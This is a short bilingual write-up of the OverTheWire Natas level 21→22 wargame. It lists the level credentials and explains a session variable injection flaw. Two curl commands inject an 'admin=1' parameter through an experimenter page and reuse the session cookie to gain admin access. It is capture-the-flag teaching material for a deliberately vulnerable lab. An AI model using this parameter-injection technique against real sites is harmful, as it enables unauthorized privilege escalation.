# Natas Nivel 21 → 22

| Campo | Valor |
|-------|-------|
| **Juego / Game** | Natas |
| **Nivel / Level** | 21 → 22 |
| **URL** | https://overthewire.org/wargames/natas/ |
| **Conexión** | `http://natas21.natas.labs.overthewire.org` |

# username
natas21
# password
BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
# web app vulnerability
Insecure Session Handling, Session Variable Injection
# method of solve
This web app allows session parameters to be set through the web app via a POST request. The code does not prevent additional parameters to be set at the same time legitimate parameters are. So we can set our `admin` session parameter to True to gain elevated access to the web app.
```
curl -X POST -u 'natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH' -v 'http://natas21-experimenter.natas.labs.overthewire.org/?debug=1' -b 'PHPSESSID=413e96uk941o14rn1jb52ak29m' -d 'align=center&fontsize=100%25&bgcolor=yellow&admin=1&submit=Update'
# This command sets ours admin parameter to 1, which is required to gain access to the password in the main web app page.
curl -u 'natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH' -v 'http://natas21.natas.labs.overthewire.org/' -b 'PHPSESSID=413e96uk941o14rn1jb52ak29m'
```

---

## Fuentes / Sources

- OTW: https://overthewire.org/wargames/natas/ - fecha de acceso: 2026-09-25.
- Autor notas: Apuromafo.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a OverTheWire.
> **EN:** Educational and personal use only. Not affiliated with OverTheWire.

_Fecha de edición: 2026-09-25_
